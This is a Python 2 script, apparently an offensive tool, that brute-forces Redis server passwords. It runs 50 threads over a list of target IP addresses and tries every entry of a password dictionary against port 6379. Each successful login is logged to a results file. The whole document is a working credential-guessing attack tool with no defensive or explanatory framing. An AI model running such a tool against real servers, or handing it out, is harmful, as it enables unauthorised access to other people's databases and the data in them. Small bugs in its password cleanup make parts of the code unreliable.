#!python
#-*- coding:utf8 -*-
# author			: glacier@insight-labs.org
# version			: v1.0

import redis
import os
import Queue
import threading

dicpath ='pass.dic'
ipfile ='s.txt'
exitFlag = 0
wr = open("./result.txt",'w')

class CrackRedisThread(threading.Thread):
    def __init__(self,threadid, q):
        threading.Thread.__init__(self)
        self.tid = threadid
        self.q = q
    def run(self):
        print "Starting " + str(self.tid) + "thread"
        CrackRedis(self.q)
        print "Exiting " + str(self.tid) + "thread"


def CrackRedis(ip):
	while not exitFlag:
		if not workQueue.empty():
			queueLock.acquire()
			server_addr = ip.get()
			queueLock.release()
			with open(dicpath) as f:
				for line in f:
					pw = line.strip()
					pw.replace('\n','')
					pw.replace('\r','')
					pw = line
					if(pw=='NULL'):
						pw = ''
					print(server_addr + ":" + pw)
					try:
						r = redis.Redis(host=server_addr, port=6379, db=0,password=pw,socket_timeout=3)
						db_size=r.dbsize()
						print(server_addr + pw + " sucessful")
						wr.write(server_addr + pw + " sucessful\n")
						break
					except redis.exceptions.ResponseError:
						print pw + " fail"
						pass
					except :
						pass
			f.close()
			ip.task_done()


queueLock = threading.Lock()
workQueue = Queue.Queue(10)
threads = []
tid = 0
# 创建新线程
for i in range(50):
    thread = CrackRedisThread(tid,workQueue)
    thread.start()
    threads.append(thread)
    tid = tid + 1


# 填充队列

with open(ipfile) as ips:
	for ip in ips:
		#print ip
		workQueue.put(ip)

# 等待队列清空
while not workQueue.empty():
    pass

# 通知线程是时候退出
exitFlag = 1

# 等待所有线程完成
for t in threads:
    t.join()

wr.close()
print "Exiting Main Thread"